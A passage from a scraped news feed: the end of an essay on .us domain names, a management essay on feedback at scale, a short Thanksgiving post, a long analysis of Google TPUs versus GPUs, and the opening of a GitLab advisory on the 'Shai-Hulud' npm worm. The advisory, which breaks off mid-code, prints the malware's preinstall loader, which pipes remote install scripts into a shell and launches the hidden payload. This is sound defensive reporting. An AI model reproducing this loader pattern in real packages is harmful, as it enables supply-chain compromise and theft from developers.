    &lt;p&gt;You look at Reddit these days and see all these usernames that are two random words and four random numbers, and you see that Postel and Cooper were right. Flat namespaces create a problem, names must either be complex or long, and people don't like it either. What I think they got wrong, at a usability level, is that deep hierarchies still create names that are complex and long. It's a kind of complexity that computer scientists are more comfortable with, but that's little reassurance when you're staring down the barrel of "bridger.pps.k12.or.us".&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://computer.rip/2025-11-11-dot-us.html"/><published>2025-11-26T13:36:19+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46058471</id><title>Feedback doesn't scale</title><updated>2025-11-28T11:33:58.401354+00:00</updated><content>&lt;doc fingerprint="2162924d3cc7e49e"&gt;
  &lt;main&gt;&lt;head rend="h1"&gt;Feedback doesn't scale&lt;/head&gt;&lt;head rend="h2"&gt;Listening is always hard, and it only gets harder at scale.&lt;/head&gt;&lt;p&gt;When you're leading a team of five or 10 people, feedback is pretty easy. It's not even really "feedback”: you’re just talking. You may have hired everyone yourself. You might sit near them (or at least sit near them virtually). Maybe you have lunch with them regularly. You know their kids' names, their coffee preferences, and what they're reading. So when someone has a concern about the direction you're taking things, they just... tell you.&lt;/p&gt;&lt;p&gt;You trust them. They trust you. It's just friends talking. You know where they're coming from.&lt;/p&gt;&lt;p&gt;At twenty people, things begin to shift a little. You’re probably starting to build up a second layer of leadership and there are multiple teams under you, but you're still fairly close to everyone. The relationships are there, they just may be a bit weaker than before. When someone has a pointed question about your strategy, you probably mostly know their story, their perspective, and what motivates them. The context is fuzzy, but it’s still there.&lt;/p&gt;&lt;head rend="h2"&gt;Then you hit 100&lt;/head&gt;&lt;p&gt;Somewhere around 100 people, the ground shifts underneath you, as you realize you don’t know everyone anymore. You just can't. There aren't enough hours in the day, and honestly, there aren't enough slots in your brain.&lt;/p&gt;&lt;p&gt;Suddenly you have people whose names you don’t recognize offering very sharp commentary about your “leadership.” They’re talking about you but they don’t know you. There’s no shared history, no accumulated trust, no sense of “we’ve been in the trenches together.” Your brain has no context for processing all these voices.&lt;/p&gt;&lt;p&gt;Who are these people? Why are they yelling at me? Are they generally reasonable, or do they complain about everything? Do they understand the constraints we're under? Do they have the full picture?&lt;/p&gt;&lt;p&gt;Without an existing relationship, it feels like an attack, and your natural human response is to dismiss or deflect the attack. Or worse, to get defensive. Attacks trigger our most primal instincts: fight or flight.&lt;/p&gt;&lt;p&gt;This is the point where a lot of leaders start to struggle. They still want to be open to feedback—they really do—but they're also drowning. They start trusting their intuition about what they should pay attention to and what they should ignore. Sometimes that intuition is right. Sometimes it's just... self-selected, stripped of context, pattern matching against existing biases and relationships.&lt;/p&gt;&lt;p&gt;On top of that, each extra layer of management, each extra level to the top has separated you, and now you’re just not like them anymore. Their struggles are not your struggles anymore.&lt;/p&gt;&lt;head rend="h2"&gt;At 200, it's a deluge&lt;/head&gt;&lt;p&gt;By the time you reach 200 people or more, feedback isn't an actionable signal anymore. At that size, feedback stops being signal being noise. A big, echoing amphitheater of opinions, each louder than the last, each written in the tone of someone who is absolutely certain they understand the whole system (they don’t), the whole context (they don’t), and your motives (they definitely don’t).&lt;/p&gt;&lt;p&gt;And all those kudos you used to hear? Those dry up. When you had a close relationship with everyone, kudos came naturally. You were just talking. But now folks just expect you to lead, and if they’re happy with your leadership they’re probably mostly quiet about it. They're doing their jobs, trusting you, assuming things are generally fine.&lt;/p&gt;&lt;p&gt;The people who are unhappy? They're loud. And there are a lot of them.&lt;/p&gt;&lt;p&gt;From where you sit, it feels like everybody's mad about everything all the time. And maybe they are! Or maybe it's just selection bias combined with the natural amplification that happens when people with similar grievances find each other. You don't know if this is a real crisis or just three loud people who found each other in a Slack channel. You just can’t tell anymore.&lt;/p&gt;&lt;p&gt;Because feedback doesn’t scale. Humans scale poorly. Your nervous system definitely doesn’t scale.&lt;/p&gt;&lt;head rend="h2"&gt;Why this happens&lt;/head&gt;&lt;p&gt;Feedback doesn't scale because relationships don’t scale. With five people, you have some personal interaction with everyone on the team. At twenty, you interact with some, but not all. At 100 you still have personal relationships with 10 or 15 people, so there are a lot of gaps. At 200, your personal relationships are a tiny slice of the overall pie.&lt;/p&gt;&lt;p&gt;Making matters worse, as the din gets louder and louder, channels for processing all that feedback get smaller and smaller. Where you once had an open-door policy, now you have “office hours.” Sometimes. When we’re not too busy.&lt;/p&gt;&lt;p&gt;Where once All-Hands meetings had open questions, now you’re forced to take the questions ahead of time. Or not at all.&lt;/p&gt;&lt;p&gt;Even your Slack usage dwindles, because half the time you say anything, someone’s upset with it.&lt;/p&gt;&lt;p&gt;We tell ourselves we're "staying close to the ground" and "maintaining our culture,” But we're not. We can't. Because the fundamental math doesn't work. The sheer volume of feedback we’re getting absolutely overwhelms our ability to process it.&lt;/p&gt;&lt;head rend="h2"&gt;So what do you do about it?&lt;/head&gt;&lt;p&gt;First, you have to admit the problem exists. Stop pretending you can maintain personal relationships with 200 people. You can't. Nobody can. Once you accept this, you can start building systems and processes that work with this reality instead of bumping against it. You have to filter, sort, and collate the feedback coming in, and you need to do it at a scale larger than your own capacity.&lt;/p&gt;&lt;p&gt;When you can’t rely on “just talk to people,” you need systems that distinguish between:&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;legitimate issues&lt;/item&gt;&lt;item&gt;noise&lt;/item&gt;&lt;item&gt;venting&lt;/item&gt;&lt;item&gt;misunderstandings&lt;/item&gt;&lt;item&gt;and “this person is projecting a whole other problem onto leadership”&lt;/item&gt;&lt;/list&gt;&lt;p&gt;That means: structured listening, actual intake processes, and ways to synthesize themes instead of reacting to every single spike.&lt;/p&gt;&lt;p&gt;Build proxy relationships. You can't know 200 people, but you can know 10 people who each know 10 people. You should already have strong, trusting relationships with your leadership team, and then set the expectation that they have strong relationships with their own teams, and explicitly ask what’s on people’s minds. When feedback comes up through this chain, it comes with context. Pay attention.&lt;/p&gt;&lt;p&gt;At small scale, trust is direct: I know you. You know me. At larger scale, trust must be delegated: I trust the leaders who are closer to the work than I am. If you don’t intentionally empower those leaders to absorb and contextualize feedback, you’ll drown. They’re the ones who can say: "I know who said that, why they said it, and here’s what’s actually going on."&lt;/p&gt;&lt;p&gt;Build structured channels for feedback. For example, you can set up working groups to dive into thorny problems. The people closest to the problem understand it better than you do, and they can turn a flood of complaints into something you can actually act on. Or consider starting an "employee steering committee" for the sole purpose of collecting feedback and turning it into proposals. You’re essentially deputizing people who care deeply to listen for you, and then manage the feedback din.&lt;/p&gt;&lt;p&gt;Remember that every angry message is still a person. When someone you know well gives you feedback, you might not like it, but you’re likely to say "Oof. Okay. Let’s talk." At scale, you need to find ways to respond with humanity — even when the feedback you received lacks it.&lt;/p&gt;&lt;p&gt;Close the feedback loop. Let people know when you’re acting on their feedback, and if you’re not going to act on it, let them know that you at least heard it. Nobody wants to feel unheard.&lt;/p&gt;&lt;p&gt;In fact, you'll probably think — if you haven't done it already — that you should have an anonymous comment system to capture feedback. Don't. It's a trap. Anonymous feedback is the most contextless feedback you'll get, which makes it the least actionable. And it inevitably turns out to be contradictory or lacking key information, all those folks feel even more unheard and unhappy than before.&lt;/p&gt;&lt;p&gt;Finally, accept that you're going to get it wrong sometimes, and own that. You're going to ignore feedback that turns out to be important. You're going to overreact to feedback that turns out to be noise. When you make a misstep, be transparent about how you're correcting it.&lt;/p&gt;&lt;head rend="h2"&gt;The uncomfortable truth&lt;/head&gt;&lt;p&gt;Past a certain size, you have to make peace with the fact that a lot of people in your org are going to be frustrated with you, and you're going to have no idea why, and you may not going to be able to fix it.&lt;/p&gt;&lt;p&gt;Not because you're a bad leader. Not because you don't care. But because feedback doesn't scale, relationships don't scale, and the alternative—trying to maintain authentic personal connections with hundreds of people—is a recipe for burnout and failure.&lt;/p&gt;&lt;p&gt;This is genuinely hard to accept, especially if you came up through the early days when you did know everyone. That version of leadership was real, and it worked, and it probably felt really good. But it doesn't work anymore, and pretending it does just makes things worse.&lt;/p&gt;&lt;p&gt;Note: The photo is of a large crowd gathering for a union meeting during the 1933 New York Dressmakers Strike. That's scaling feedback.&lt;/p&gt;Published in Writing&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://another.rodeo/feedback/"/><published>2025-11-26T15:40:14+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46065955</id><title>Tell HN: Happy Thanksgiving</title><updated>2025-11-28T11:33:57.964622+00:00</updated><content>&lt;doc fingerprint="7f4ed38a148e83a2"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;p&gt;I’ve been a part of this community for fifteen years. Despite the yearly bemoaning of HN’s quality compared to its mythical past, I’ve found that it’s the one community that has remained steadfast as a source of knowledge, cattiness, and good discussion.&lt;/p&gt;
      &lt;p&gt;Thank you @dang and @tomhow.&lt;/p&gt;
      &lt;p&gt;Here's to another year.&lt;/p&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://news.ycombinator.com/item?id=46065955"/><published>2025-11-27T05:21:16+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46069048</id><title>TPUs vs. GPUs and why Google is positioned to win AI race in the long term</title><updated>2025-11-28T11:33:57.296344+00:00</updated><content>&lt;doc fingerprint="3d3a95c811b6b1f1"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;The chip made for the AI inference era – the Google TPU&lt;/head&gt;
    &lt;p&gt;Hey everyone,&lt;/p&gt;
    &lt;p&gt;As I find the topic of Google TPUs extremely important, I am publishing a comprehensive deep dive, not just a technical overview, but also strategic and financial coverage of the Google TPU.&lt;/p&gt;
    &lt;p&gt;Topics covered:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;The history of the TPU and why it all even started?&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The difference between a TPU and a GPU?&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Performance numbers TPU vs GPU?&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Where are the problems for the wider adoption of TPUs&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Google’s TPU is the biggest competitive advantage of its cloud business for the next 10 years&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;How many TPUs does Google produce today, and how big can that get?&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Gemini 3 and the aftermath of Gemini 3 on the whole chip industry&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Let’s dive into it.&lt;/p&gt;
    &lt;p&gt;The history of the TPU and why it all even started?&lt;/p&gt;
    &lt;p&gt;The story of the Google Tensor Processing Unit (TPU) begins not with a breakthrough in chip manufacturing, but with a realization about math and logistics. Around 2013, Google’s leadership—specifically Jeff Dean, Jonathan Ross (the CEO of Groq), and the Google Brain team—ran a projection that alarmed them. They calculated that if every Android user utilized Google’s new voice search feature for just three minutes a day, the company would need to double its global data center capacity just to handle the compute load.&lt;/p&gt;
    &lt;p&gt;At the time, Google was relying on standard CPUs and GPUs for these tasks. While powerful, these general-purpose chips were inefficient for the specific heavy lifting required by Deep Learning: massive matrix multiplications. Scaling up with existing hardware would have been a financial and logistical nightmare.&lt;/p&gt;
    &lt;p&gt;This sparked a new project. Google decided to do something rare for a software company: build its own custom silicon. The goal was to create an ASIC (Application-Specific Integrated Circuit) designed for one job only: running TensorFlow neural networks.&lt;/p&gt;
    &lt;p&gt;Key Historical Milestones:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;2013-2014: The project moved really fast as Google both hired a very capable team and, to be honest, had some luck in their first steps. The team went from design concept to deploying silicon in data centers in just 15 months—a very short cycle for hardware engineering.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;2015: Before the world knew they existed, TPUs were already powering Google’s most popular products. They were silently accelerating Google Maps navigation, Google Photos, and Google Translate.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;2016: Google officially unveiled the TPU at Google I/O 2016.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This urgency to solve the “data center doubling” problem is why the TPU exists. It wasn’t built to sell to gamers or render video; it was built to save Google from its own AI success. With that in mind, Google has been thinking about the »costly« AI inference problems for over a decade now. This is also one of the main reasons why the TPU is so good today compared to other ASIC projects.&lt;/p&gt;
    &lt;p&gt;The difference between a TPU and a GPU?&lt;/p&gt;
    &lt;p&gt;To understand the difference, it helps to look at what each chip was originally built to do. A GPU is a “general-purpose” parallel processor, while a TPU is a “domain-specific” architecture.&lt;/p&gt;
    &lt;p&gt;The GPUs were designed for graphics. They excel at parallel processing (doing many things at once), which is great for AI. However, because they are designed to handle everything from video game textures to scientific simulations, they carry “architectural baggage.” They spend significant energy and chip area on complex tasks like caching, branch prediction, and managing independent threads.&lt;/p&gt;
    &lt;p&gt;A TPU, on the other hand, strips away all that baggage. It has no hardware for rasterization or texture mapping. Instead, it uses a unique architecture called a Systolic Array.&lt;/p&gt;
    &lt;p&gt;The “Systolic Array” is the key differentiator. In a standard CPU or GPU, the chip moves data back and forth between the memory and the computing units for every calculation. This constant shuffling creates a bottleneck (the Von Neumann bottleneck).&lt;/p&gt;
    &lt;p&gt;In a TPU’s systolic array, data flows through the chip like blood through a heart (hence “systolic”).&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;It loads data (weights) once.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;It passes inputs through a massive grid of multipliers.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The data is passed directly to the next unit in the array without writing back to memory.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;What this means, in essence, is that a TPU, because of its systolic array, drastically reduces the number of memory reads and writes required from HBM. As a result, the TPU can spend its cycles computing rather than waiting for data.&lt;/p&gt;
    &lt;p&gt;Google’s new TPU design, also called Ironwood also addressed some of the key areas where a TPU was lacking:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;They enhanced the SparseCore for efficiently handling large embeddings (good for recommendation systems and LLMs)&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;It increased HBM capacity and bandwidth (up to 192 GB per chip). For a better understanding, Nvidia’s Blackwell B200 has 192GB per chip, while Blackwell Ultra, also known as the B300, has 288 GB per chip.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Improved the Inter-Chip Interconnect (ICI) for linking thousands of chips into massive clusters, also called TPU Pods (needed for AI training as well as some time test compute inference workloads). When it comes to ICI, it is important to note that it is very performant with a Peak Bandwidth of 1.2 TB/s vs Blackwell NVLink 5 at 1.8 TB/s. But Google’s ICI, together with its specialized compiler and software stack, still delivers superior performance on some specific AI tasks.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The key thing to understand is that because the TPU doesn’t need to decode complex instructions or constantly access memory, it can deliver significantly higher Operations Per Joule.&lt;/p&gt;
    &lt;p&gt;For scale-out, Google uses Optical Circuit Switch (OCS) and its 3D torus network, which compete with Nvidia’s InfiniBand and Spectrum-X Ethernet. The main difference is that OCS is extremely cost-effective and power-efficient as it eliminates electrical switches and O-E-O conversions, but because of this, it is not as flexible as the other two. So again, the Google stack is extremely specialized for the task at hand and doesn’t offer the flexibility that GPUs do.&lt;/p&gt;
    &lt;p&gt;Performance numbers TPU vs GPU?&lt;/p&gt;
    &lt;p&gt;As we defined the differences, let’s look at real numbers showing how the TPU performs compared to the GPU. Since Google isn’t revealing these numbers, it is really hard to get details on performance. I studied many articles and alternative data sources, including interviews with industry insiders, and here are some of the key takeaways.&lt;/p&gt;
    &lt;p&gt;The first important thing is that there is very limited information on Google’s newest TPUv7 (Ironwood), as Google introduced it in April 2025 and is just now starting to become available to external clients (internally, it is said that Google has already been using Ironwood since April, possibly even for Gemini 3.0.). And why is this important if we, for example, compare TPUv7 with an older but still widely used version of TPUv5p based on Semianalysis data:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;TPUv7 produces 4,614 TFLOPS(BF16) vs 459 TFLOPS for TPUv5p&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;TPUv7 has 192GB of memory capacity vs TPUv5p 96GB&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;TPUv7 memory Bandwidth is 7,370 GB/s vs 2,765 for v5p&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We can see that the performance leaps between v5 and v7 are very significant. To put that in context, most of the comments that we will look at are more focused on TPUv6 or TPUv5 than v7.&lt;/p&gt;
    &lt;p&gt;Based on analyzing a ton of interviews with Former Google employees, customers, and competitors (people from AMD, NVDA &amp;amp; others), the summary of the results is as follows.&lt;/p&gt;
    &lt;p&gt;Most agree that TPUs are more cost-effective compared to Nvidia GPUs, and most agree that the performance per watt for TPUs is better. This view is not applicable across all use cases tho.&lt;/p&gt;
    &lt;p&gt;A Former Google Cloud employee:&lt;/p&gt;
    &lt;p&gt;»If it is the right application, then they can deliver much better performance per dollar compared to GPUs. They also require much lesser energy and produces less heat compared to GPUs. They’re also more energy efficient and have a smaller environmental footprint, which is what makes them a desired outcome.&lt;/p&gt;
    &lt;p&gt;The use cases are slightly limited to a GPU, they’re not as generic, but for a specific application, they can offer as much as 1.4X better performance per dollar, which is pretty significant saving for a customer that might be trying to use GPU versus TPUs.«&lt;/p&gt;
    &lt;p&gt;source: AlphaSense&lt;/p&gt;
    &lt;p&gt;Similarly, a very insightful comment from a Former Unit Head at Google around TPUs materially lowering AI-search cost per query vs GPUs:&lt;/p&gt;
    &lt;p&gt;»TPU v6 is 60-65% more efficient than GPUs, prior generations 40-45%«&lt;/p&gt;
    &lt;p&gt;This interview was in November 2024, so the expert is probably comparing the v6 TPU with the Nvidia Hopper. Today, we already have Blackwell vs V7.&lt;/p&gt;
    &lt;p&gt;Many experts also mention the speed benefit that TPUs offer, with a Former Google Head saying that TPUs are 5x faster than GPUs for training dynamic models (like search-like workloads).&lt;/p&gt;
    &lt;p&gt;There was also a very eye-opening interview with a client who used both Nvidia GPUs and Google TPUs as he describes the economics in great detail:&lt;/p&gt;
    &lt;p&gt;»If I were to use eight H100s versus using one v5e pod, I would spend a lot less money on one v5e pod. In terms of price point money, performance per dollar, you will get more bang for TPU. If I already have a code, because of Google’s help or because of our own work, if I know it already is going to work on a TPU, then at that point it is beneficial for me to just stick with the TPU usage.&lt;/p&gt;
    &lt;p&gt;In the long run, if I am thinking I need to write a new code base, I need to do a lot more work, then it depends on how long I’m going to train. I would say there is still some, for example, of the workload we have already done on TPUs that in the future because as Google will add newer generation of TPU, they make older ones much cheaper.&lt;lb/&gt;For example, when they came out with v4, I remember the price of v2 came down so low that it was practically free to use compared to any NVIDIA GPUs.&lt;/p&gt;
    &lt;p&gt;Google has got a good promise so they keep supporting older TPUs and they’re making it a lot cheaper. If you don’t really need your model trained right away, if you’re willing to say, “I can wait one week,” even though the training is only three days, then you can reduce your cost 1/5.«&lt;/p&gt;
    &lt;p&gt;source: AlphaSense&lt;/p&gt;
    &lt;p&gt;Another valuable interview was with a current AMD employee, acknowledging the benefits of ASICs:&lt;/p&gt;
    &lt;p&gt;»I would expect that an AI accelerator could do about probably typically what we see in the industry. I’m using my experience at FPGAs. I could see a 30% reduction in size and maybe a 50% reduction in power vs a GPU.«&lt;/p&gt;
    &lt;p&gt;We also got some numbers from a Former Google employee who worked in the chip segment:&lt;/p&gt;
    &lt;p&gt;»When I look at the published numbers, they (TPUs) are anywhere from 25%-30% better to close to 2x better, depending on the use cases compared to Nvidia. Essentially, there’s a difference between a very custom design built to do one task perfectly versus a more general purpose design.«&lt;/p&gt;
    &lt;p&gt;What is also known is that the real edge of TPUs lies not in the hardware but in the software and in the way Google has optimized its ecosystem for the TPU.&lt;/p&gt;
    &lt;p&gt;A lot of people mention the problem that every Nvidia »competitor« like the TPU faces, which is the fast development of Nvidia and the constant »catching up« to Nvidia problem. This month a former Google Cloud employee addressed that concern head-on as he believes the rate at which TPUs are improving is faster than the rate at Nvidia:&lt;/p&gt;
    &lt;p&gt;»The amount of performance per dollar that a TPU can generate from a new generation versus the old generation is a much significant jump than Nvidia«&lt;/p&gt;
    &lt;p&gt;In addition, the recent data from Google’s presentation at the Hot Chips 2025 event backs that up, as Google stated that the TPUv7 is 100% better in performance per watt than their TPUv6e (Trillium).&lt;/p&gt;
    &lt;p&gt;Even for hard Nvidia advocates, TPUs are not to be shrugged off easily, as even Jensen thinks very highly of Google’s TPUs. In a podcast with Brad Gerstner, he mentioned that when it comes to ASICs, Google with TPUs is a »special case«. A few months ago, we also got an article from the WSJ saying that after the news publication The Information published a report that stated that OpenAI had begun renting Google TPUs for ChatGPT, Jensen called Altman, asking him if it was true, and signaled that he was open to getting the talks back on track (investment talks). Also worth noting was that Nvidia’s official X account posted a screenshot of an article in which OpenAI denied plans to use Google’s in-house chips. To say the least, Nvidia is watching TPUs very closely.&lt;/p&gt;
    &lt;p&gt;Ok, but after looking at some of these numbers, one might think, why aren’t more clients using TPUs?&lt;/p&gt;
    &lt;p&gt;Where are the problems for the wider adoption of TPUs&lt;/p&gt;
    &lt;p&gt;The main problem for TPUs adoption is the ecosystem. Nvidia’s CUDA is engraved in the minds of most AI engineers, as they have been learning CUDA in universities. Google has developed its ecosystem internally but not externally, as it has used TPUs only for its internal workloads until now. TPUs use a combination of JAX and TensorFlow, while the industry skews to CUDA and PyTorch (although TPUs also support PyTorch now). While Google is working hard to make its ecosystem more supportive and convertible with other stacks, it is also a matter of libraries and ecosystem formation that takes years to develop.&lt;/p&gt;
    &lt;p&gt;It is also important to note that, until recently, the GenAI industry’s focus has largely been on training workloads. In training workloads, CUDA is very important, but when it comes to inference, even reasoning inference, CUDA is not that important, so the chances of expanding the TPU footprint in inference are much higher than those in training (although TPUs do really well in training as well – Gemini 3 the prime example).&lt;/p&gt;
    &lt;p&gt;The fact that most clients are multi-cloud also poses a challenge for TPU adoption, as AI workloads are closely tied to data and its location (cloud data transfer is costly). Nvidia is accessible via all three hyperscalers, while TPUs are available only at GCP so far. A client who uses TPUs and Nvidia GPUs explains it well:&lt;/p&gt;
    &lt;p&gt;»Right now, the one biggest advantage of NVIDIA, and this has been true for past three companies I worked on is because AWS, Google Cloud and Microsoft Azure, these are the three major cloud companies.&lt;/p&gt;
    &lt;p&gt;Every company, every corporate, every customer we have will have data in one of these three. All these three clouds have NVIDIA GPUs. Sometimes the data is so big and in a different cloud that it is a lot cheaper to run our workload in whatever cloud the customer has data in.&lt;/p&gt;
    &lt;p&gt;I don’t know if you know about the egress cost that is moving data out of one cloud is one of the bigger cost. In that case, if you have NVIDIA workload, if you have a CUDA workload, we can just go to Microsoft Azure, get a VM that has NVIDIA GPU, same GPU in fact, no code change is required and just run it there.&lt;/p&gt;
    &lt;p&gt;With TPUs, once you are all relied on TPU and Google says, “You know what? Now you have to pay 10X more,” then we would be screwed, because then we’ll have to go back and rewrite everything. That’s why. That’s the only reason people are afraid of committing too much on TPUs. The same reason is for Amazon’s Trainium and Inferentia.«&lt;/p&gt;
    &lt;p&gt;source: AlphaSense&lt;/p&gt;
    &lt;p&gt;These problems are well known at Google, so it is no surprise that internally, the debate over keeping TPUs inside Google or starting to sell them externally is a constant topic. When keeping them internally, it enhances the GCP moat, but at the same time, many former Google employees believe that at some point, Google will start offering TPUs externally as well, maybe through some neoclouds, not necessarily with the biggest two competitors, Microsoft and Amazon. Opening up the ecosystem, providing support, etc., and making it more widely usable are the first steps toward making that possible.&lt;/p&gt;
    &lt;p&gt;A former Google employee also mentioned that Google last year formed a more sales-oriented team to push and sell TPUs, so it’s not like they have been pushing hard to sell TPUs for years; it is a fairly new dynamic in the organization.&lt;/p&gt;
    &lt;p&gt;Google’s TPU is the biggest competitive advantage of its cloud business for the next 10 years&lt;/p&gt;
    &lt;p&gt;The most valuable thing for me about TPUs is their impact on GCP. As we witness the transformation of cloud businesses from the pre-AI era to the AI era, the biggest takeaway is that the industry has gone from an oligopoly of AWS, Azure, and GCP to a more commoditized landscape, with Oracle, Coreweave, and many other neoclouds competing for AI workloads. The problem with AI workloads is the competition and Nvidia’s 75% gross margin, which also results in low margins for AI workloads. The cloud industry is moving from a 50-70% gross margin industry to a 20-35% gross margin industry. For cloud investors, this should be concerning, as the future profile of some of these companies is more like that of a utility than an attractive, high-margin business. But there is a solution to avoiding that future and returning to a normal margin: the ASIC.&lt;/p&gt;
    &lt;p&gt;The cloud providers who can control the hardware and are not beholden to Nvidia and its 75% gross margin will be able to return to the world of 50% gross margins. And there is no surprise that all three AWS, Azure, and GCP are developing their own ASICs. The most mature by far is Google’s TPU, followed by Amazon’s Trainum, and lastly Microsoft’s MAIA (although Microsoft owns the full IP of OpenAI’s custom ASICs, which could help them in the future).&lt;/p&gt;
    &lt;p&gt;While even with ASICs you are not 100% independent, as you still have to work with someone like Broadcom or Marvell, whose margins are lower than Nvidia’s but still not negligible, Google is again in a very good position. Over the years of developing TPUs, Google has managed to control much of the chip design process in-house. According to a current AMD employee, Broadcom no longer knows everything about the chip. At this point, Google is the front-end designer (the actual RTL of the design) while Broadcom is only the backend physical design partner. Google, on top of that, also, of course, owns the entire software optimization stack for the chip, which makes it as performant as it is. According to the AMD employee, based on this work split, he thinks Broadcom is lucky if it gets a 50-point gross margin on its part.&lt;/p&gt;
    &lt;p&gt;Without having to pay Nvidia for the accelerator, a cloud provider can either price its compute similarly to others and maintain a better margin profile or lower costs and gain market share. Of course, all of this depends on having a very capable ASIC that can compete with Nvidia. Unfortunately, it looks like Google is the only one that has achieved that, as the number one-performing model is Gemini 3 trained on TPUs. According to some former Google employees, internally, Google is also using TPUs for inference across its entire AI stack, including Gemini and models like Veo. Google buys Nvidia GPUs for GCP, as clients want them because they are familiar with them and the ecosystem, but internally, Google is full-on with TPUs.&lt;/p&gt;
    &lt;p&gt;As the complexity of each generation of ASICs increases, similar to the complexity and pace of Nvidia, I predict that not all ASIC programs will make it. I believe outside of TPUs, the only real hyperscaler shot right now is AWS Trainium, but even that faces much bigger uncertainties than the TPU. With that in mind, Google and its cloud business can come out of this AI era as a major beneficiary and market-share gainer.&lt;/p&gt;
    &lt;p&gt;Recently, we even got comments from the SemiAnalysis team praising the TPU:&lt;/p&gt;
    &lt;p&gt;»Google’s silicon supremacy among hyperscalers is unmatched, with their TPU 7th Gen arguably on par with Nvidia Blackwell. TPU powers the Gemini family of models which are improving in capability and sit close to the pareto frontier of $ per intelligence in some tasks«&lt;/p&gt;
    &lt;p&gt;source: SemiAnalysis&lt;/p&gt;
    &lt;p&gt;How many TPUs does Google produce today, and how big can that get?&lt;/p&gt;
    &lt;p&gt;Here are the numbers that I researched:&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.uncoveralpha.com/p/the-chip-made-for-the-ai-inference"/><published>2025-11-27T13:28:34+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46070203</id><title>GitLab discovers widespread NPM supply chain attack</title><updated>2025-11-28T11:33:56.982090+00:00</updated><content>&lt;doc fingerprint="850426190c2b864a"&gt;
  &lt;main&gt;&lt;p&gt;Published on: November 24, 2025&lt;/p&gt;&lt;p&gt;9 min read&lt;/p&gt;&lt;p&gt;Malware driving attack includes "dead man's switch" that can harm user data.&lt;/p&gt;&lt;p&gt;GitLab's Vulnerability Research team has identified an active, large-scale supply chain attack involving a destructive malware variant spreading through the npm ecosystem. Our internal monitoring system has uncovered multiple infected packages containing what appears to be an evolved version of the "Shai-Hulud" malware.&lt;/p&gt;&lt;p&gt;Early analysis shows worm-like propagation behavior that automatically infects additional packages maintained by impacted developers. Most critically, we've discovered the malware contains a "dead man's switch" mechanism that threatens to destroy user data if its propagation and exfiltration channels are severed.&lt;/p&gt;&lt;p&gt;We verified that GitLab was not using any of the malicious packages and are sharing our findings to help the broader security community respond effectively.&lt;/p&gt;&lt;p&gt;Our internal monitoring system, which scans open-source package registries for malicious packages, has identified multiple npm packages infected with sophisticated malware that:&lt;/p&gt;&lt;p&gt;While we've confirmed several infected packages, the worm-like propagation mechanism means many more packages are likely compromised. The investigation is ongoing as we work to understand the full scope of this campaign.&lt;/p&gt;&lt;p&gt;The malware infiltrates systems through a carefully crafted multi-stage loading process. Infected packages contain a modified &lt;code&gt;package.json&lt;/code&gt; with a preinstall script pointing to &lt;code&gt;setup_bun.js&lt;/code&gt;. This loader script appears innocuous, claiming to install the Bun JavaScript runtime, which is a legitimate tool. However, its true purpose is to establish the malware's execution environment.&lt;/p&gt;&lt;code&gt;// This file gets added to victim's packages as setup_bun.js
#!/usr/bin/env node
async function downloadAndSetupBun() {
  // Downloads and installs bun
  let command = process.platform === 'win32' 
    ? 'powershell -c "irm bun.sh/install.ps1|iex"'
    : 'curl -fsSL https://bun.sh/install | bash';
  
  execSync(command, { stdio: 'ignore' });
  
  // Runs the actual malware
  runExecutable(bunPath, ['bun_environment.js']);
}
